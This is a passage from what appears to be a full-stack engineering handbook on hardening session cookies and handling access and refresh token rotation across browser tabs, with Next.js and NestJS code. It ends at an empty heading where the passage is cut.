Cookies are older than most of the web's security model. Their defaults were designed for convenience in 1994: sent on every request to the domain, from any page, over any scheme, readable by any script. Every attribute added since then (Secure and HttpOnly early on, SameSite in 2016, prefixes in 2016, Partitioned in 2023) is an opt-in to a safer behaviour. Getting a session cookie right means opting into all the safe behaviours your app can tolerate, because the browser will not do it for you consistently: Chrome treats a cookie without SameSite as Lax, but Firefox and Safari do not, so the same Set-Cookie line behaves differently across browsers unless you are explicit.

Mental model

Imagine a wristband at a music festival. The band's colour says which areas you may enter (Path, Domain), the "staff only, cannot be removed" clasp means nobody can slip it off your wrist (HttpOnly), it only works inside the fenced grounds (Secure), and the guards at each gate check whether you walked in from inside the festival or from the car park (SameSite). The prefix is a band printed by the festival itself, which a stall vendor inside the grounds cannot counterfeit.

How it works

When the browser builds a request, it decides for each stored cookie whether to attach it:

flowchart TB
    start["Request to https://shop.example/orders"] --> host{"Domain matches? Host-only cookie needs exact host"}
    host -->|"no"| skip["Not sent"]
    host -->|"yes"| path{"Path is a prefix of the URL path?"}
    path -->|"no"| skip
    path -->|"yes"| sec{"Secure cookie and request is https?"}
    sec -->|"no"| skip
    sec -->|"yes"| exp{"Expired?"}
    exp -->|"yes"| skip
    exp -->|"no"| site{"Request same-site with the page that started it?"}
    site -->|"yes"| send["Sent"]
    site -->|"no"| ss{"SameSite value"}
    ss -->|"Strict"| skip
    ss -->|"Lax"| nav{"Top-level navigation with a safe method like GET?"}
    nav -->|"yes"| send
    nav -->|"no"| skip
    ss -->|"None"| send

The attributes, one at a time:

  1. Secure: sent only over HTTPS, and (in modern browsers) cannot be set by an http:// page. Without it, any hop on an open Wi-Fi network sees the cookie on the first plain-HTTP request before the HSTS redirect.
  2. HttpOnly: invisible to document.cookie and to the Cookie Store API. It is still sent with requests, which is the point.
  3. SameSite compares the site of the request's target with the site of the page that initiated it. A site is the scheme plus the registrable domain (eTLD+1): https://shop.example, https://api.shop.example and https://blog.shop.example are all the same site; https://shop.example and https://shop-payments.example are not. The registrable domain comes from the Public Suffix List, which is why alice.github.io and bob.github.io are different sites. Strict sends only on same-site requests. Lax also sends on cross-site top-level navigations with safe methods (a user clicking a link from Gmail). None sends everywhere and requires Secure.
  4. Domain: omit it and the cookie is host-only, sent to shop.example and nothing else. Set Domain=shop.example and it is sent to every subdomain too. Setting it widens scope; it never narrows it.
  5. Path: the cookie is sent only to URLs under that path. Use it to keep a cookie off requests that do not need it (a refresh token scoped to /api/auth), not as a security boundary between pages on the same origin.
  6. Max-Age / Expires: with neither, it is a "session cookie" deleted when the browser session ends, though "continue where you left off" in Chrome and Firefox restores those cookies too. Browsers following RFC 6265bis cap lifetimes at 400 days.
  7. Prefixes are enforced by the browser at set time. A cookie named __Secure-x is rejected unless it has Secure and comes from HTTPS. A cookie named __Host-x is rejected unless it has Secure, Path=/ and no Domain. That last rule means no subdomain can ever set or overwrite a __Host- cookie for your host, which closes the cookie-injection attacks that break naive CSRF tokens (75.6).
  8. Partitioned (CHIPS) is for third-party contexts: an embedded widget's cookie is keyed by the top-level site, so the same widget on two sites gets two separate cookie jars. A first-party session cookie does not need it.

Size is the attribute nobody sets and everybody hits:

Limit Value What happens past it
One cookie, name plus value 4,096 bytes in all major browsers The browser silently ignores the Set-Cookie
Cookies per domain about 180 in Chrome, similar elsewhere The oldest are evicted, possibly the session
Node.js total request header size 16 KB by default (--max-http-header-size) 431 Request Header Fields Too Large
nginx large_client_header_buffers 4 buffers of 8 KB by default 400 Request Header Or Cookie Too Large
Every request to the domain Cookie bytes sent each time Slower uploads on mobile, larger CDN logs

A 15-minute RS256 access token with sub, sid, roles, iss, aud, iat, exp and a kid header is about 700 to 900 bytes. Add a list of 60 permission strings and it passes 3 KB. This is why the session cookie should carry identity and coarse roles only; fine-grained permissions come from /v1/me (71.3) or are checked on the server.

The recommended settings for this volume's stack:

Cookie Name Path SameSite HttpOnly Lifetime Why
Access token (JWT) __Host-session / Lax Yes 14 min (token lasts 15) Sent on page loads and same-origin API calls; Lax keeps links from emails working
Refresh token (opaque) __Secure-refresh /api/auth Lax Yes 14 days, rotated Sent only to the refresh and logout handlers; __Host- is impossible because of Path
CSRF token __Host-csrf / Strict No (the page must read it) Same as session Signed double-submit (75.6)
A/B bucket, consent plain names / Lax No Months Not credentials; still Secure

Why Lax and not Strict for the session? With Strict, a user who clicks an order-shipped link in their email lands on /orders/ord_42 without the cookie, because the navigation started on another site. The page renders as logged out; a reload (now same-site) suddenly shows them logged in. Users read that as a bug. Lax sends the cookie on that navigation, and the remaining CSRF exposure (top-level GETs) is closed by never changing state on GET. Banks and admin consoles often accept the Strict behaviour on purpose; a storefront usually should not.

Practical example

A retailer runs shop.example (Next.js), api.shop.example (NestJS), blog.shop.example (a hosted CMS run by a marketing agency) and help.shop.example (a SaaS help desk on a CNAME). With Domain=shop.example on the session cookie, every page view on the blog and the help desk carries the user's session to servers the retailer does not run. Their access logs, their analytics and any XSS on their pages now see a live credential.

With the BFF and rewrites (73.8), the browser only ever talks to shop.example for the app, so the session cookie can be host-only: __Host-session, no Domain. The blog and help desk never see it, and a compromised subdomain cannot overwrite it either.

React / Next.js example

One module owns every auth cookie, so names, paths and options cannot drift between the login action, the refresh handler, middleware and logout:

// apps/web/lib/auth-cookies.ts
import 'server-only';

export const SESSION_COOKIE = '__Host-session';
export const REFRESH_COOKIE = '__Secure-refresh';
export const REFRESH_PATH = '/api/auth';
const SKEW_SEC = 60;                                   // the cookie dies a minute before the JWT inside it

// Structural type: matches both cookies() in Route Handlers and Server Actions, and NextResponse.cookies.
type CookieJar = { set(name: string, value: string, options: Record<string, unknown>): unknown };
type Tokens = { accessToken: string; accessExpiresIn: number; refreshToken: string; refreshExpiresIn: number };

export function setAuthCookies(jar: CookieJar, t: Tokens): void {
  jar.set(SESSION_COOKIE, t.accessToken, {
    httpOnly: true, secure: true, sameSite: 'lax', path: '/',
    maxAge: Math.max(t.accessExpiresIn - SKEW_SEC, 0),
  });
  jar.set(REFRESH_COOKIE, t.refreshToken, {
    httpOnly: true, secure: true, sameSite: 'lax', path: REFRESH_PATH,
    maxAge: t.refreshExpiresIn,
  });
}

export function clearAuthCookies(jar: CookieJar): void {
  // Deleting means setting the same name, path and flags with Max-Age 0; a different Path creates a second cookie.
  jar.set(SESSION_COOKIE, '', { httpOnly: true, secure: true, sameSite: 'lax', path: '/', maxAge: 0 });
  jar.set(REFRESH_COOKIE, '', { httpOnly: true, secure: true, sameSite: 'lax', path: REFRESH_PATH, maxAge: 0 });
}

The jar parameter accepts both cookies() from next/headers (in Server Actions and Route Handlers, where it is writable) and response.cookies on a NextResponse (in middleware and Route Handlers). Server components cannot set cookies at all in the App Router, because the response headers have already been sent by the time they stream; that single fact shapes the refresh design in 75.3.

In local development over http://localhost, Chrome and Firefox treat localhost as a secure context and accept Secure and __Host- cookies; Safari historically did not. Run the dev server with HTTPS (next dev --experimental-https in Next.js 14 and later) so development matches production instead of adding an "if dev, drop Secure" branch that eventually ships.

Backend side (NestJS)

NestJS does not set browser cookies in this design (the BFF does, 75.10), but it reads them on proxied API calls and must handle them correctly:

// apps/api/src/main.ts  (excerpt)
import { NestFactory } from '@nestjs/core';
import type { NestExpressApplication } from '@nestjs/platform-express';
import cookieParser from 'cookie-parser';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create<NestExpressApplication>(AppModule);
  app.use(cookieParser());                 // populates req.cookies for the JwtStrategy extractor (81.1)
  app.set('trust proxy', 1);               // exactly one hop: the Next.js tier or the load balancer (79.8)
  await app.listen(3000);
}
bootstrap();

And a guard rail that stops a growing token from silently breaking logins:

// apps/api/src/auth/token-size.ts
import { Logger } from '@nestjs/common';

const log = new Logger('TokenSize');
const WARN_BYTES = 2_048;                  // half the browser's 4 KB cookie limit
const FAIL_BYTES = 3_800;                  // leave room for the name and attributes

export function assertCookieSafe(token: string, userId: string): void {
  const bytes = Buffer.byteLength(token, 'utf8');
  if (bytes > FAIL_BYTES) throw new Error(`Access token too large for a cookie: ${bytes} bytes`);
  if (bytes > WARN_BYTES) log.warn({ userId, bytes }, 'access token approaching cookie size limit');
}

Call it from the token issuer, and add a unit test that issues a token for the user with the most roles in a production snapshot. Other API-side rules:

  • Never mutate on GET. SameSite=Lax sends cookies on cross-site top-level GETs; GET /v1/orders/42/cancel would be CSRF-able (40.22).
  • Send Cache-Control: private, no-store on every response that depends on the cookie, so a CDN never caches one user's page for another (75.9).
  • Do not set Domain on any cookie unless you have written down which subdomains need it and who runs them.

Production scenario

A B2B ordering portal added fine-grained permissions to its JWT: one string per permission, such as orders:approve:region:north. Enterprise customers with many regions reached 140 permissions. Their access token grew to 5.1 KB. Chrome dropped the Set-Cookie silently, so those users logged in, were redirected to the dashboard, and arrived logged out. The redirect loop affected 0.4 % of users, all of them the largest accounts. Separately, users whose token was 3.9 KB hit nginx's 8 KB per-line header buffer once the analytics and consent cookies were added, and got 400 Request Header Or Cookie Too Large on every page.

The fix took the permissions out of the token. The JWT carried sub, sid, tenant and two coarse roles (about 820 bytes); NestJS loaded permissions per request from Redis with a 60-second local cache (about 0.3 ms on a hit). The token-size check above went into CI with a fixture of the largest real role set.

Failure scenario

At 16:05 a security researcher emailed: the retailer's session cookie was visible to promo.shop.example, a campaign microsite built by an agency on a third-party page builder. The page builder's analytics script logged full request headers for "debugging". The cookie had been set with Domain=shop.example two years earlier so that a now-retired account.shop.example could read it.

The response was a rotation and a design change. All sessions were revoked (the refresh-family revoke in 40.3 made that one SQL statement), the cookie was renamed to __Host-session, which the browser refuses to accept with a Domain attribute, and a CI check was added that fails if any Set-Cookie in the auth code contains Domain=. The rename itself mattered: an old session cookie with Domain and a new host-only session cookie can coexist in the browser, and which one the server reads first depends on ordering it does not control. A new name makes the old cookie irrelevant; the logout handler also clears the legacy name for one release.

Edge cases & failure modes

  • Two cookies with the same name but different Path or Domain are both sent; servers usually read the first, which may be the stale one. Clear with exactly the same attributes you set.
  • The 400-day cap: a "remember me for 2 years" cookie silently becomes 400 days in Chrome.
  • SameSite=None without Secure is rejected outright by modern browsers.
  • Schemeful same-site: http://shop.example and https://shop.example are different sites in modern browsers; a mixed-scheme redirect can strip Lax and Strict cookies.
  • Lax-allowing-unsafe: Chrome sends cookies that have no SameSite attribute on top-level cross-site POSTs for two minutes after they are set, to keep old single-sign-on flows working. Always set SameSite explicitly.
  • Redirect chains that start on another site count as cross-site, so Strict cookies are withheld even on later same-site hops in the chain.
  • Third-party cookie blocking in Safari and Firefox (and in Chrome for users who opt in) breaks any design where your session cookie must be sent from inside someone else's page; that is what Partitioned and the Storage Access API are for.
  • Cookies are per host, not per port: localhost:3000 and localhost:4000 share cookies, which confuses local multi-app setups.

How a Senior Full-Stack Engineer thinks about this

The senior treats the Set-Cookie line as security-critical configuration with one owner and one module, never as something each handler writes by hand. They default to __Host-, host-only, Path=/, Secure, HttpOnly, explicit SameSite, and widen only with a written reason. They keep tokens small because cookie bytes are paid on every request and failure past 4 KB is silent. They choose Lax for storefronts and Strict for back-office tools, and they know exactly which user journeys each choice breaks: email links for Strict, nothing important for Lax as long as GET is safe.

Common mistakes

  • Domain=example.com "to be safe", which shares the session with every subdomain and every vendor on a CNAME.
  • Leaving SameSite unset and relying on Chrome's default, which other browsers do not apply.
  • Clearing a cookie with a different Path than it was set with, so logout appears to work and the old cookie stays.
  • Putting permissions or profile data in the JWT until the cookie passes 4 KB.
  • Disabling Secure in development with a flag that later ships to staging or production.
  • Expecting a server component to set a cookie, which the App Router does not allow.

Interview questions

  1. What does the __Host- prefix guarantee? Expected answer: the browser only accepts the cookie if it is Secure, has Path=/ and no Domain, so it is host-only and no subdomain can set or overwrite it. Why it matters: it prevents cookie tossing and makes misconfiguration impossible. Follow-up: why can a refresh cookie scoped to /api/auth not use it? (__Host- requires Path=/; use __Secure-.)
  2. What is the difference between same-site and same-origin? Expected answer: origin is scheme, host and port; site is scheme plus registrable domain. Subdomains are same-site but cross-origin. Follow-up: why does that matter for CSRF? (An attacker on a sibling subdomain is same-site, so SameSite does not stop them.)
  3. Lax or Strict for a storefront session cookie? Expected answer: Lax, because Strict drops the cookie on navigations from other sites, such as email links; keep GET side-effect-free. Strict suits admin tools.
  4. A user logs in successfully but arrives logged out. What do you check? Expected answer: the Set-Cookie in the Network panel (DevTools shows blocked cookies with a reason), cookie size over 4 KB, Secure on HTTP, prefix rule violations, SameSite=None without Secure, a redirect across schemes, or a second cookie with the same name.
  5. How do cookie sizes cause outages? Expected answer: silent drop over 4 KB per cookie; server header limits (Node 16 KB, nginx 8 KB buffers) return 400 or 431 when the total grows.

Practical exercise

Build lib/auth-cookies.ts and a test page that sets each cookie.

Acceptance criteria:

  • The Application panel shows __Host-session as host-only with Path=/, and __Secure-refresh with Path=/api/auth.
  • A request from the browser to /orders carries only __Host-session; a request to /api/auth/refresh carries both.
  • Trying to set __Host-session with Domain=shop.example is rejected by the browser (visible as a blocked cookie in DevTools).
  • Logout removes both cookies, verified by an empty cookie list for the host.
  • A unit test fails when an access token for the largest production role set exceeds 2 KB.

75.3 Access and refresh tokens in a browser app: silent refresh, rotation, reuse detection, logout everywhere

Concept

Part 40.3 built the server half: a short-lived access token (a JWT, 10 to 15 minutes), a long-lived opaque refresh token stored hashed in PostgreSQL, rotation on every use, and reuse detection that revokes the whole token family when an already-used refresh token is presented again. This section is the browser half, which is where those mechanics meet tabs, sleeping laptops, parallel requests and users who expect "Log out" to mean everywhere.

Four browser-side jobs:

  1. Silent refresh: getting a new access token before or when the old one expires, without the user noticing.
  2. Single-flight: making sure one expiry produces one refresh, not one per request or per tab.
  3. Reacting to reuse detection: when the server revokes a family, every tab must log out cleanly instead of looping.
  4. Logout and logout everywhere: ending this tab, every tab on this device, and every device, each with a known delay.

Why does it exist?

Short access tokens limit the damage of a stolen token (40.3) and let the web tier verify locally without calling the auth service (73.9). The price is that every user's token expires four times an hour. If the app handles that badly, users see random logouts, half-saved forms and "Something went wrong" toasts at 15-minute intervals. Rotation adds a second failure mode: two requests refreshing with the same refresh token look exactly like an attacker replaying a stolen one, and reuse detection will log the user out on every device. The browser is where both problems are caused, so it is where most of the fix lives.

Mental model

Imagine a building where your day pass expires every 15 minutes and you renew it at a machine using a renewal card. Each renewal swallows the card and prints a new one. If the machine ever sees a card it already swallowed, it assumes the card was copied and cancels every card you own.

Now imagine you arrive with four colleagues who all hold photocopies of your renewal card (four tabs), and your pass expires while you are all in the lift (a laptop waking from sleep). If all five of you rush the machine at once, the second person's card is "already swallowed" and everyone is locked out. The fix is simple: one person renews and tells the others (single-flight and broadcast), and the machine forgives a second identical card within a few seconds (a grace window).

How it works

In the BFF design used by this volume, the browser holds two HttpOnly cookies (75.2): __Host-session (the access JWT, 15 minutes) and __Secure-refresh (opaque, 14 days, sent only to /api/auth). There are two places a refresh can start:

  • On navigation: middleware sees no valid session cookie but a request that may have a refresh cookie, and redirects to GET /api/auth/refresh?next=/orders. The handler rotates the tokens, sets both cookies and redirects back with 303. One extra round trip, at most once per 15 minutes per user.
  • On a client-side API call: a fetch('/api/v1/...') through rewrites returns 401 UNAUTHENTICATED. The client calls POST /api/auth/refresh once, then retries the original request once.

Middleware cannot refresh inline and hand the new token to server components without extra plumbing, because server components cannot set cookies (75.2); the redirect keeps one place responsible for rotation. 75.10 shows both paths end to end. The client-side path, with single-flight across tabs:

sequenceDiagram
    participant T1 as Tab1
    participant T2 as Tab2
    participant L as WebLock
    participant BFF as NextBFF
    participant AUTH as NestJSAuth
    T1->>BFF: GET /api/v1/orders
    BFF-->>T1: 401 UNAUTHENTICATED
    T2->>BFF: GET /api/v1/cart
    BFF-->>T2: 401 UNAUTHENTICATED
    T1->>L: request lock auth-refresh
    T2->>L: request lock auth-refresh, waits
    T1->>BFF: POST /api/auth/refresh with R1 cookie
    BFF->>AUTH: refresh R1
    AUTH-->>BFF: new access A2, refresh R2
    BFF-->>T1: 204, Set-Cookie session A2, refresh R2
    T1->>L: release
    L-->>T2: lock granted
    T2->>BFF: POST /api/auth/refresh with A2 and R2 cookies
    BFF-->>T2: 204 already fresh, no rotation
    T1->>BFF: retry GET /api/v1/orders
    T2->>BFF: retry GET /api/v1/cart

Step by step:

  1. Classify the 401. Only UNAUTHENTICATED (expired or missing access token) triggers a refresh. FORBIDDEN is a 403 and never refreshes; REFRESH_REUSED and SESSION_REVOKED go straight to logout (74.6's classifier sends 401s to the reauth treatment).
  2. Single-flight inside the tab. A module-level promise means ten concurrent 401s in one tab share one refresh.
  3. Single-flight across tabs. The Web Locks API (navigator.locks.request(name, callback)) grants a named lock to one tab at a time on the same origin. Tab 2 waits while Tab 1 refreshes. When Tab 2 gets the lock, the browser already holds the new cookies, so its refresh request carries a valid access token, and the handler answers "already fresh" without rotating. No second use of R1 ever reaches the server.
  4. Retry once. The original request is retried exactly once. A second 401 means the session is really gone.
  5. Broadcast the outcome. A BroadcastChannel named auth tells every tab "refreshed" or "logged out", so idle tabs update their UI without waiting for their own failed request.

Proactive versus reactive refresh:

Approach How Strength Weakness
Reactive (on 401) Refresh when a request fails, retry once Simple; no timers; works after sleep First request after expiry pays one extra round trip
Proactive timer Refresh at 80 % of lifetime No visible delay Background tabs throttle timers (Chrome runs them at most once a minute after 5 minutes hidden); laptops sleep through them; every open tab refreshes
On visibilitychange Check when the tab becomes visible Catches wake from sleep Still needs the reactive path
On navigation (middleware redirect) Refresh before rendering a protected page Server-rendered pages never see an expired token One redirect per expiry

The pragmatic combination is reactive plus navigation, with an optional check on visibilitychange. Timers alone are not reliable in browsers.

Reuse detection, from the user's side. When NestJS sees a used refresh token outside its grace window, it revokes the family and returns 401 REFRESH_REUSED. The BFF clears both cookies, and the client broadcasts "logged out" and navigates to /login?reason=security. The login page explains: "For your security, please sign in again." Without that copy, users file bugs.

Logout everywhere has three reach levels with different delays:

Scope Mechanism Delay
This tab Clear cookies, clear TanStack Query cache, navigate Immediate
Other tabs, same browser Cookies are shared, so they are already gone; BroadcastChannel updates their UI Immediate
Other devices Revoke all refresh families; bump a per-user auth epoch in Redis that NestJS checks on every request Next API call, typically seconds; the web tier's local JWT check still passes for up to 15 minutes, but every data call fails

The epoch is a timestamp (auth:epoch:<userId>). Any access token whose iat is older than the epoch is rejected. One Redis GET per request (0.2 to 0.5 ms) turns "logged out within 15 minutes" into "logged out on the next call". Many teams apply it only to cookie-authenticated browser routes and sensitive endpoints, and accept the 15-minute window elsewhere.

Practical example

A food delivery customer has the app open in three tabs (menu, cart, order tracking) and closes the laptop at 13:00. At 13:50 she opens it. The order tracking tab's SSE connection reconnects (72.8), the cart tab refetches on window focus (72.3), and the menu tab prefetches two links. That is five requests within 200 ms, all with an access token that expired at 13:15.

With single-flight across tabs: five 401s, one lock, one rotation, four "already fresh" answers, five successful retries. Total delay about 40 ms on top of each request. Without it: three tabs each refresh with R1, the server rotates for the first, the next two arrive inside the grace window (below) and get the same R2 back. Without the grace window either: reuse detection fires and she is logged out on her phone too.

React / Next.js example

The fetch wrapper that every apiGet and apiSend call (72.2, 72.4) goes through:

// apps/web/src/api/auth-fetch.ts
import { toApiError } from './errors';

const channel = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel('auth') : null;
let inFlight: Promise<boolean> | null = null;                 // single-flight inside this tab

async function doRefresh(): Promise<boolean> {
  const res = await fetch('/api/auth/refresh', { method: 'POST', credentials: 'include', cache: 'no-store' });
  if (res.ok) { channel?.postMessage({ type: 'refreshed' }); return true; }
  const err = await toApiError(res);
  channel?.postMessage({ type: 'logged-out', reason: err.code }); // REFRESH_REUSED, SESSION_EXPIRED, ...
  return false;
}

export function refreshOnce(): Promise<boolean> {
  inFlight ??= (navigator.locks
    ? navigator.locks.request('auth-refresh', doRefresh)       // single-flight across tabs of this origin
    : doRefresh()
  ).finally(() => { inFlight = null; });
  return inFlight;
}

export async function authFetch(input: string, init: RequestInit = {}): Promise<Response> {
  const res = await fetch(input, { ...init, credentials: 'include' });
  if (res.status !== 401) return res;
  const code = res.headers.get('X-Auth-Error');                // exposed by NestJS on 401s, see below
  if (code !== 'UNAUTHENTICATED') return res;                  // revoked or reused: let the caller log out
  if (!(await refreshOnce())) return res;
  return fetch(input, { ...init, credentials: 'include' });   // retry exactly once; a body must be re-sendable
}

init.body must be a string or another re-readable value for the retry to work; a ReadableStream body cannot be sent twice, so upload code (74.8) refreshes before starting rather than retrying after. Mutations retried here keep their Idempotency-Key header (72.6), so a request that actually reached the server before the 401 cannot create a duplicate.

Every tab listens for the broadcast:

// apps/web/src/auth/AuthBroadcastListener.tsx
'use client';
import { useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useQueryClient } from '@tanstack/react-query';

export function AuthBroadcastListener() {
  const router = useRouter();
  const queryClient = useQueryClient();
  useEffect(() => {
    const channel = new BroadcastChannel('auth');
    channel.onmessage = (e: MessageEvent<{ type: string; reason?: string }>) => {
      if (e.data.type === 'logged-out') {
        queryClient.clear();                                   // no other user's data survives in memory
        router.replace(`/login?reason=${encodeURIComponent(e.data.reason ?? 'signed-out')}`);
      }
      if (e.data.type === 'refreshed') void queryClient.invalidateQueries({ queryKey: ['me'] });
    };
    return () => channel.close();
  }, [router, queryClient]);
  return null;
}

Mount it once in the root layout's client providers. BroadcastChannel does not deliver a message to the tab that posted it, so the tab that initiated logout handles its own navigation.

Backend side (NestJS)

Three API-side pieces make the browser logic safe: a machine-readable reason on every 401, a grace window for concurrent rotation, and the auth epoch.

// apps/api/src/auth/refresh.service.ts  (the parts 82.3 did not show)
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { InjectRedis } from '@nestjs-modules/ioredis';
import type Redis from 'ioredis';
import { TokenStore } from './token.store';                     // 22.3's refresh_tokens repository
import type { TokenPair } from './types';

const GRACE_SEC = 20;

@Injectable()
export class RefreshService {
  constructor(private readonly store: TokenStore, @InjectRedis() private readonly redis: Redis) {}

  async rotate(rawRefresh: string): Promise<TokenPair> {
    const hash = this.store.hash(rawRefresh);
    const graceKey = `refresh:grace:${hash}`;
    const cached = await this.redis.get(graceKey);             // a sibling request rotated this token moments ago
    if (cached) return JSON.parse(cached) as TokenPair;

    const row = await this.store.findByHash(hash);
    if (!row || row.revokedAt || row.expiresAt < new Date()) throw this.unauth('SESSION_EXPIRED');
    const claimed = await this.store.markUsedIfUnused(row.id); // UPDATE ... WHERE id = $1 AND used_at IS NULL
    if (!claimed) {                                            // used before, and outside the grace window
      await this.store.revokeFamily(row.familyId);
      throw this.unauth('REFRESH_REUSED');
    }
    const pair = await this.store.issueChild(row);             // new access JWT plus new refresh in the same family
    await this.redis.set(graceKey, JSON.stringify(pair), 'EX', GRACE_SEC);
    return pair;
  }

  async logoutEverywhere(userId: string): Promise<void> {
    await this.store.revokeAllForUser(userId);                 // UPDATE refresh_tokens SET revoked_at = now() ...
    await this.redis.set(`auth:epoch:${userId}`, Math.floor(Date.now() / 1000), 'EX', 60 * 60);
  }

  private unauth(code: string) {
    return new UnauthorizedException({ code, title: 'Not signed in', status: 401 });
  }
}

The grace cache holds a live token pair in Redis for 20 seconds, keyed by the hash of the token it replaced. That is a deliberate tradeoff: a Redis compromise during those 20 seconds exposes freshly issued tokens, in exchange for not logging users out when their own tabs race. Encrypt the cached value with a key from your secrets manager if Redis is shared with other services. The epoch key expires after one hour because any access token issued before the bump is dead by then anyway (15-minute lifetime).

The guard that enforces the epoch and labels every 401:

// apps/api/src/auth/jwt-auth.guard.ts
import { ExecutionContext, Injectable, UnauthorizedException } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';
import { InjectRedis } from '@nestjs-modules/ioredis';
import type Redis from 'ioredis';
import type { Response } from 'express';

@Injectable()
export class JwtAuthGuard extends AuthGuard('jwt') {
  constructor(@InjectRedis() private readonly redis: Redis) { super(); }

  async canActivate(ctx: ExecutionContext): Promise<boolean> {
    const res = ctx.switchToHttp().getResponse<Response>();
    try {
      await super.canActivate(ctx);                           // signature, exp, iss, aud via JwtStrategy
    } catch {
      res.setHeader('X-Auth-Error', 'UNAUTHENTICATED');        // the browser may refresh and retry
      throw new UnauthorizedException({ code: 'UNAUTHENTICATED', title: 'Not signed in', status: 401 });
    }
    const user = ctx.switchToHttp().getRequest().user as { id: string; issuedAt: number };
    const epoch = Number(await this.redis.get(`auth:epoch:${user.id}`)) || 0;
    if (user.issuedAt < epoch) {
      res.setHeader('X-Auth-Error', 'SESSION_REVOKED');        // do not refresh: the family is gone
      throw new UnauthorizedException({ code: 'SESSION_REVOKED', title: 'Signed out', status: 401 });
    }
    return true;
  }
}

@nestjs-modules/ioredis is a community module; if you use another Redis provider, inject its client the same way. The response body already carries code in the problem document (74.6); the header exists because authFetch must decide before reading the body, and a body can be read only once. If the API is ever called cross-origin, list X-Auth-Error in CORS exposedHeaders.

Production scenario

A grocery app with 60,000 concurrent web sessions at the evening peak and 15-minute access tokens performs about 67 refreshes per second (60,000 / 900). Each refresh is a unique-index probe, a conditional UPDATE and an INSERT in PostgreSQL (about 4 ms p50, 11 ms p99) plus two Redis calls. After adding cross-tab single-flight, refresh traffic fell 38 %, because users averaged 1.7 open tabs and each tab had been refreshing separately. False reuse detections, measured as families revoked within 20 seconds of a legitimate rotation, fell from 1,900 per day to 12, almost all from users with clock-skewed devices replaying very old tabs.

Failure scenario

At 07:30 every weekday for two weeks, support saw a wave of "I keep getting logged out on my phone" tickets, about 3 % of morning users. The web team had just enabled viewport prefetching for order links on the home page. On waking a laptop, the home page's <Link> components prefetched up to 12 order pages at once. Each prefetch hit middleware with an expired session cookie, each was redirected to GET /api/auth/refresh, and the browser followed all 12 redirects concurrently with the same refresh cookie. The first rotated; the other eleven presented a used token. There was no grace window, so the auth service revoked the family. The user's phone, signed in through the same family since a "continue on web" link, was logged out too.

Three fixes shipped: the 20-second grace window above; the refresh handler skipping rotation when the incoming access token still has more than 60 seconds left; and middleware answering prefetch requests (identified by the Next-Router-Prefetch request header) with 204 instead of a refresh redirect, so only real navigations trigger rotation. False revocations stopped the next morning.

Edge cases & failure modes

  • Request bodies that cannot be replayed (streams, FormData from a large file input) must refresh first, not retry after.
  • Refresh during a long form: a 20-minute checkout form submitted after expiry must refresh and retry transparently, with the idempotency key preserved, or the user loses their input.
  • Clock skew on the client does not matter for cookie-held tokens, because the browser never inspects exp; it matters for SPAs that schedule refresh from a decoded JWT.
  • Offline and flaky networks: a refresh that times out is not a logout. Treat network errors as "retry later", and only an explicit 401 from the refresh endpoint as signed out.
  • Safari private browsing and old browsers lack BroadcastChannel or Web Locks in some versions; the code falls back to per-tab behaviour, and the grace window covers the race.
  • Refresh loops: if the refresh handler itself is matched by middleware and redirected to refresh, the browser loops until it gives up. Exclude /api/auth from the matcher.
  • "Remember me" off: issue a refresh cookie with no Max-Age, so it dies with the browser session, and a family with a short absolute lifetime (12 hours).
  • Absolute lifetime: rotation must not extend a family forever; enforce a 30-day maximum from the original login and force re-authentication after it.

How a Senior Full-Stack Engineer thinks about this

The senior designs refresh as a concurrency problem first and a security feature second, because the bugs users feel are races. They want one owner for rotation (the BFF's refresh handler), one owner for the decision to refresh (the fetch wrapper and the navigation redirect), machine-readable reasons on every 401, and a grace window sized to the real race (seconds, not minutes). They make "logout everywhere" a product promise with a stated delay, and they buy a shorter delay with the epoch check where the data is sensitive. They measure: refreshes per second, rotations served from grace, families revoked by reuse, and logouts per session hour. A sudden rise in reuse revocations after a frontend deploy is a race the deploy introduced, not an attack.

Common mistakes
